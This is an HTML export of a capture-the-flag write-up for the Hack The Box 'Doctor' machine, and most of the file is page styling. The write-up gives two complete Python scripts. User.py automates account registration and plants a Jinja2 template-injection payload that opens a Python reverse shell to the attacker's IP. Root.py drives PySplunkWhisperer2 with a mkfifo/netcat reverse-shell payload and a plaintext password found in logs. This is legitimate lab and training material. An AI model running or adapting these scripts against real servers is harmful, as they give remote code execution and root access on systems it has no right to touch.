@@ -1,0 +1,735 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>doctor</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+</style></head><body><article id="0d783d49-29a3-48bf-bfcb-b55a24cd5a48" class="page sans"><header><h1 class="page-title">doctor</h1></header><div class="page-body"><h1 id="4000b00a-2385-4b12-825d-530945554e24" class="">HTB Doctor</h1><figure id="54322e62-1dee-4acc-9521-6f24aeafd4b2" class="image"><a href="images/doctor/doc-head.png"><img style="width:539px" src="images/doctor/doc-head.png"/></a></figure><p id="06e134b7-1692-4893-a52a-228542f8f267" class="">We start out with the usual nmap scan</p><figure id="24f36039-b3c5-4a69-9f82-f77c84b83936" class="image"><a href="images/doctor/doc-nmap.png"><img style="width:737px" src="images/doctor/doc-nmap.png"/></a></figure><p id="514a9920-62b2-4ce6-b3c8-d378350a52c6" class="">Points of interest here are a web server on port 80 and some sort of splunk server running on 8089</p><figure id="352f43d2-0a99-439b-a327-38492c424498" class="image"><a href="images/doctor/web-start-page.png"><img style="width:1000px" src="images/doctor/web-start-page.png"/></a></figure><figure id="3b072e6d-098e-4157-b699-34d37e9db927" class="image"><a href="images/doctor/splunk.png"><img style="width:1000px" src="images/doctor/splunk.png"/></a></figure><p id="52ce1334-24de-4b1e-afe6-37f9ad3a6b55" class="">We&#x27;re not able to pull much info out of the splunk interface, since all the dirs require creds.</p><p id="1f0edc48-3b17-453c-a679-6ffbd15ab0b7" class="">The contact us page on the webserver has a link to the domain</p><p id="008238b2-ec1e-4f9f-985b-256cd4083b76" class=""><strong>doctors.htb — </strong>this was some sort of login portal</p><figure id="a06d4467-a90f-424b-b271-567ccf7899e9" class="image"><a href="images/doctor/login-page.png"><img style="width:1000px" src="images/doctor/login-page.png"/></a></figure><p id="b9f42ace-d430-40a5-84d2-74ca64e95109" class="">After creating a new account and logging in, there is a page to create a new post/comment.</p><figure id="a8c545c3-985c-4db6-a4cf-203f7cbc9749" class="image"><a href="images/doctor/inject1-post.png"><img style="width:958px" src="images/doctor/inject1-post.png"/></a></figure><p id="96844dee-9d59-45c7-9f80-c54dfebf6f0b" class="">In the page source there is a hidden link to the /archive page, which appears to display our posts/comments.</p><figure id="f9034a66-9cce-41f0-b14d-b295d72973ed" class="image"><a href="images/doctor/archive.png"><img style="width:1000px" src="images/doctor/archive.png"/></a></figure><p id="eb84a639-f5e4-406b-ac8a-b9c370fcf052" class="">The archive page displays our posts/comments, and they are not being sanitized whatsoever. We can directly inject html in the /archive page.</p><figure id="6bd78b5d-6163-4307-aa5e-29225b97fe8f" class="image"><a href="images/doctor/inject1.png"><img style="width:1000px" src="images/doctor/inject1.png"/></a></figure><p id="f2109591-fdd5-41f8-9cc2-14c6c6ec3c9f" class="">The challenge now becomes how can we inject html such that when it gets executed we receive a reverse shell.</p><p id="1f468ec6-a0c7-423c-8009-7af4666c934b" class="">I found an awesome <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">html injection resource here</a></p><p id="18e6cdc0-7a63-421a-be67-7ff0cefc94d4" class="">Initially I tried the basic injection. I tried to get the server to execute {4*4*4} so that when we query /archive, the number 64 is presented.</p><p id="75c33c2d-6f2c-48b4-b4a4-d31c248e1657" class="">We can see on the archive page source that our code is inside of both a title and item bracket, so our injection will start out closing those first.</p><p id="d90be087-df6b-4d5d-82a1-1c3b9e9801f5" class="">
+</p><p id="806e6854-f8c9-43e5-9c6b-e475bbe21e3f" class="">
+</p><p id="24823164-02c8-4f35-b0b1-49e3c2bb54d0" class="">After injecting</p><pre id="edd6e466-8673-413b-b287-7b030952645a" class="code"><code>         &lt;/title&gt; &lt;/item&gt; {4*4*4}     </code></pre><p id="b4c499b7-1163-47b2-81bd-acd88ce27609" class="">
+</p><p id="1d64b768-d3c4-4fd3-bc35-02ebf846c2e3" class="">The page source on /archive should look like</p><pre id="0ae4a262-4756-44df-9d74-354fdadf070a" class="code"><code>         &lt;item&gt; &lt;title&gt; &lt;/title&gt; &lt;/item&gt; 64&lt;/title&gt; &lt;/item&gt;     </code></pre><p id="8699889c-2f88-4450-a58e-a823a65cbe0e" class="">
+</p><p id="742bbc1f-e0a1-459a-bf17-0f265f49a5ec" class="">
+</p><p id="646de4fc-1b12-4a65-8242-50eb3fa75c16" class="">Success, we can see the expected output 64</p><figure id="b2c7a71c-dd8e-4530-ba4d-4a7fb6e4ae67" class="image"><a href="images/doctor/inject2.png"><img style="width:952px" src="images/doctor/inject2.png"/></a></figure><p id="0e6480a4-8429-49aa-b805-ffadd781ed35" class="">
+</p><p id="1f4045b3-3032-4121-a8d9-b2944ac8f4ca" class="">
+</p><p id="9245f7af-f225-4f35-ae08-7a3c5cce301e" class="">Further down the github link there is a popen() method where it appears we can run shell commands. I started creating a python script to put all this together.</p><p id="439b6511-70c8-4d4a-86f7-8846c8854a5f" class="">First step is to grab all of our headers/cookies on the 3 necessary requests from burpsuite.</p><p id="7e157a8f-8f30-4f58-b674-9742c5d2335e" class=""><em>Registering a new account</em></p><figure id="0115997d-d433-453d-97e0-27819d108e65" class="image"><a href="images/doctor/burp-register-post.png"><img style="width:633px" src="images/doctor/burp-register-post.png"/></a></figure><p id="b15a6172-f92e-44c4-8478-9126f7093e5e" class=""><em>Logging in to new account</em></p><figure id="8d5d5047-9a5f-4860-ba3a-69fd7f7f9951" class="image"><a href="images/doctor/burp-login-post.png"><img style="width:629px" src="images/doctor/burp-login-post.png"/></a></figure><p id="3bbc7466-0a12-4038-8e9b-f31415cffad5" class=""><em>Posting comment from new account</em></p><figure id="0b7689bd-ced6-45c6-aabd-525a91cd725a" class="image"><a href="images/doctor/burp-post-comment.png"><img style="width:636px" src="images/doctor/burp-post-comment.png"/></a></figure><p id="12586bc8-c29c-448d-ab16-0795954eab32" class="">I then developed the below python script. The script will:</p><p id="2fa5aa8b-c82e-42eb-9789-7e7b15b406ae" class="">generate a random string
+register a new account under that string
+log in and create a new post (with jinja2 popen injection)
+start up a nc listener
+visit the /archive page to trigger the connection.
+interact with listener</p><h1 id="057c8b80-02fc-446a-91ed-651b10a409c0" class="">User.py</h1><pre id="b9ef1322-2014-4fdd-8fae-7f61255f49fe" class="code"><code>    #!/usr/bin/python3
+
+    from pwn import *
+    import requests, time, random, string
+
+    my_ip = &quot;10.10.14.29&quot;
+    my_port = &quot;8000&quot;
+
+    reg_url      = &#x27;http://doctors.htb/register&#x27;
+    login_url    = &#x27;http://doctors.htb/login&#x27;
+    home_url     = &#x27;http://doctors.htb/home&#x27;
+    inject_url   = &#x27;http://doctors.htb/post/new&#x27;
+    archive_url  = &#x27;http://doctors.htb/archive&#x27;
+
+    # generate a random string
+    def get_random_string(length):
+            letters = string.ascii_lowercase
+            result_str = &#x27;&#x27;.join(random.choice(letters) for i in range(length))
+            return result_str
+
+    user = get_random_string(6).capitalize()
+    email = user + &quot;@yahoo.com&quot;
+
+    # Exploit the SSTI by calling Popen without guessing the offset
+    # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
+    exploit = &quot;&quot;
+    exploit += &quot; &quot;
+    exploit += &quot;{% for x in ().__class__.__base__.__subclasses__() %}{% if \&quot;warning\&quot; in x.__name__ %}&quot;
+    exploit += &quot;{{x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(\&quot;python3 -c &#x27;import socket,subprocess,os;&quot;
+    exploit += &quot;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&quot;
+    exploit += &quot;s.connect((\\\&quot;&quot;
+    exploit +=  my_ip + &quot;\\\&quot;,&quot;
+    exploit +=  my_port + &quot;)); &quot;
+    exploit += &quot;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);&quot;
+    exploit += &quot;p=subprocess.call([\\\&quot;/bin/bash\\\&quot;, \\\&quot;-i\\\&quot;]);&#x27;\&quot;).read().zfill(417)}}{%endif%}{% endfor %}&quot;
+
+    # the data for our 3 post requests, burpsuite
+    reg_dict = { &#x27;username&#x27;: user, &#x27;email&#x27;: email, &#x27;password&#x27;: &#x27;test&#x27;, &#x27;confirm_password&#x27;: &#x27;test&#x27;, &#x27;submit&#x27;: &#x27;Sign+Up&#x27;}
+    login_dict = { &#x27;email&#x27;: email, &#x27;password&#x27;: &#x27;test&#x27;, &#x27;submit&#x27;: &#x27;Login&#x27;}
+    inject_dict = { &#x27;title&#x27;: exploit, &#x27;content&#x27;: &#x27;Hello World&#x27;, &#x27;submit&#x27;: &#x27;Post&#x27; }
+
+    with requests.Session() as session:
+
+            # Attempt to hit the register endpoint and create an account
+            get = session.get(reg_url)
+            post = session.post(reg_url, data=reg_dict)
+            if &quot;Your account has been created, with a time limit of twenty minutes!&quot; not in post.text:
+                print(&quot;[-] Account creation failed.. exiting&quot;)
+                exit(0)
+            print(&quot;[+] Created account &quot; + email)
+
+            # Attempt to login with our new creds
+            login = session.post(login_url, data=login_dict)
+            if &quot;Logout&quot; not in login.text:
+                print(&quot;[-] Login failed.. exiting&quot;)
+                exit(0)
+            print(&quot;[+] Login success&quot;)
+
+            # Create our post with exploit string
+            injection = session.post(inject_url, data=inject_dict)
+            if &quot;Your post has been created!&quot; not in injection.text:
+                print(&quot;[-] Post creation failed.. exiting&quot;)
+                exit(0)
+            print(&quot;[+] Post created successfully&quot;)
+
+            # Startup listener and trigger our injected code
+            l = listen(my_port)
+            time.sleep(2)
+            print(&quot;[+] Querying /archive to trigger shell&quot;)
+            try:
+                archive = session.get(archive_url, timeout=0.5)
+            except:
+                l.interactive()
+    </code></pre><p id="97d7ed0c-d919-4122-b14e-b72bc0064b24" class="">The end result is a user shell as web on doctor.</p><figure id="8a8fbd9c-6133-4824-98c0-307bd4961d91" class="image"><a href="images/doctor/low-priv-script.png"><img style="width:1166px" src="images/doctor/low-priv-script.png"/></a></figure><h1 id="69b5f8fb-ac5b-4522-94e5-bb10dc08774e" class="">PRIVESC</h1><p id="ab817e8a-2bf5-47cd-873d-2efecdf1c0fa" class="">There is a backup file present in the apache logs, which contained a password</p><figure id="85d87f91-b59b-4588-89d8-1edb783f9d01" class="image"><a href="images/doctor/finding-backup.png"><img style="width:972px" src="images/doctor/finding-backup.png"/></a></figure><figure id="1f6d524d-fc4d-4e95-b677-1e449f86f9f3" class="image"><a href="images/doctor/low-priv-pass.png"><img style="width:1114px" src="images/doctor/low-priv-pass.png"/></a></figure><p id="f426d096-cd7a-4143-814c-9e4ae89812f9" class="">This allowed us to pivot to user shaun grab the user.txt flag
+</p><figure id="17ebdfb3-3603-4205-ba9f-dc589cdf3b5c" class="image"><a href="images/doctor/user-txt.png"><img style="width:915px" src="images/doctor/user-txt.png"/></a></figure><p id="92d58d8d-e227-4337-b3cf-e3051e48504a" class="">After attaining user, I started checking out the splunk install on 8089, to see if we could trigger command injection somehow.</p><p id="e2bcfc53-84d4-4771-b72d-c7810aefee92" class="">Turns out there are several tools already built for this, I opted to use PySplunkWhisperer2 which you can <a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2">checkout here</a></p><p id="86498f15-444a-40b6-8cbb-279a4ed591cf" class="">After some trial and error I was eventually able to get a openBSD netcat one liner to work.</p><p id="f61aa77b-de1e-4903-bc90-2d359b84e315" class="">I threw this all in another python script and automated the listener.</p><h1 id="28755aab-36ce-4664-8de2-4947349b1200" class="">Root.py</h1><pre id="bd85ff29-86be-4a89-93be-cf4c5f118e5b" class="code"><code>   #!/usr/bin/python3
+
+    from pwn import *
+    import time,os
+
+    my_ip = &#x27;10.10.14.29&#x27;
+    my_port = &#x27;8001&#x27;
+    pysplunk = &#x27;/opt/SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py&#x27;
+
+
+    l = listen(my_port)
+    time.sleep(0.5)
+    exploit = &#x27;&#x27;
+    exploit += &#x27;python &#x27; + pysplunk
+    exploit += &#x27; --host 10.10.10.209 &#x27;
+    exploit += &#x27; --lhost &#x27; + my_ip + &#x27; &#x27;
+    exploit += &#x27; --username shaun --password Guitar123 &#x27;
+    exploit += &#x27; --payload &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &#x27; + my_ip + &quot; &quot; + my_port
+    exploit += &#x27; &gt;/tmp/f&quot;  &gt; /dev/null&#x27;
+
+    os.system(exploit)
+    l.interactive()
+    </code></pre><figure id="b5c4018f-157d-4b41-93dc-a4c0665d6871" class="image"><a href="images/doctor/root2.png"><img style="width:821px" src="images/doctor/root2.png"/></a></figure></div></article></body></html>
